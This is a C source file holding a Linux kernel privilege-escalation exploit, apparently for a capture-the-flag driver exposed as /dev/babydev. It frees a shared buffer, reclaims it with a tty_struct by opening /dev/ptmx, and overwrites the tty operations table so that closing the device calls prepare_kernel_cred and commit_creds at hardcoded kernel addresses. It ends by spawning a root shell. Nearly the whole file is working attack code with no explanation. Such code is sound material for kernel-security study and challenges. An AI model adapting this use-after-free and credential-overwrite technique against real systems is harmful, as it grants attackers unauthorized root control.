#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/wait.h>

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <fcntl.h>
#include <stdio.h>

#define TTY_MAGIC 0x5401
#define BUF_SIZE  0x2e0

#define PREPARE_KERNEL_CRED 0xffffffff810a1810
#define COMMIT_CREDS        0xffffffff810a1420

typedef struct {
  int counter;
} atomic_t;

struct kref {
  atomic_t refcount;
};

struct tty_struct {
  int                          magic;
  struct kref                  kref;
  struct device               *dev;
  struct tty_driver           *driver;
  const struct tty_operations *ops;
  // ...
};

struct tty_operations {
  struct tty_struct *(*lookup)(struct tty_driver *driver, void *inode, int idx);
  int (*install)(struct tty_driver *driver, struct tty_struct *tty);
  void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
  int (*open)(struct tty_struct *tty, void *filp);
  void (*close)(struct tty_struct *tty, void *filp);
  void (*shutdown)(struct tty_struct *tty);
  void (*cleanup)(struct tty_struct *tty);
  int (*write)(struct tty_struct *tty, const unsigned char *buf, int count);
  int (*put_char)(struct tty_struct *tty, unsigned char ch);
  void (*flush_chars)(struct tty_struct *tty);
  int (*write_room)(struct tty_struct *tty);
  int (*chars_in_buffer)(struct tty_struct *tty);
  int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg);
  // ...
};

void dump(char *buf, uint64_t size) {
  for (uint64_t i = 0; i < size; i++) {
    if (i % 10 == 0)
      printf("\n%.4lu: ", i);
    printf("0x%.2x ", (uint8_t) * (buf + i));
  }
  printf("\n");
}

int fake_close() {
  void *creds = ((void *(*)(void *))PREPARE_KERNEL_CRED)(NULL);
  ((void *(*)(void *))COMMIT_CREDS)(creds);
  return 0;
}

int main() {
  int  fd1 = -1, fd2 = -1, ret = 0;
  char buf[BUF_SIZE - 1];

  fd1 = open("/dev/babydev", O_RDWR);
  fd2 = open("/dev/babydev", O_RDWR);
  bzero(buf, sizeof(buf));

  if (fd1 < 0 || fd2 < 0) {
    perror("open failed");
    goto done;
  }

  if ((ret = ioctl(fd1, 0x10001, BUF_SIZE)) < 0) {
    perror("ioctl failed");
    goto done;
  }

  close(fd1);
  fd1 = -1;

  if ((ret = read(fd2, buf, sizeof(buf))) < 0) {
    perror("read failed");
    goto done;
  }

  dump(buf, sizeof(buf));

  if ((fd1 = open("/dev/ptmx", O_RDONLY)) < 0) {
    perror("open failed (ptmx)");
    goto done;
  }

  if ((ret = read(fd2, buf, sizeof(buf))) < 0) {
    perror("read failed");
    goto done;
  }

  dump(buf, sizeof(buf));

  if (TTY_MAGIC != *(uint16_t *)buf) {
    puts("failed to obtain the tty_struct");
    goto done;
  }

  puts("obtained the tty_struct");

  struct tty_struct    *tty = (void *)buf;
  struct tty_operations ops;

  ops.close = (void *)fake_close;
  printf("new close: %p\n", ops.close);
  tty->ops = (void *)&ops;

  if ((ret = write(fd2, buf, sizeof(buf))) < 0) {
    perror("write failed");
    goto done;
  }

  close(fd1);
  fd1 = -1;

  if (getuid() != 0) {
    puts("exploit failed :(");
    goto done;
  }

  puts("exploit was successful, popping a shell");
  char *args[] = {"/bin/sh", NULL, NULL};
  execve("/bin/sh", args, NULL);

  perror("execve failed");

done:
  if (fd1 > 0)
    close(fd1);

  if (fd2 > 0)
    close(fd2);

  return EXIT_FAILURE;
}
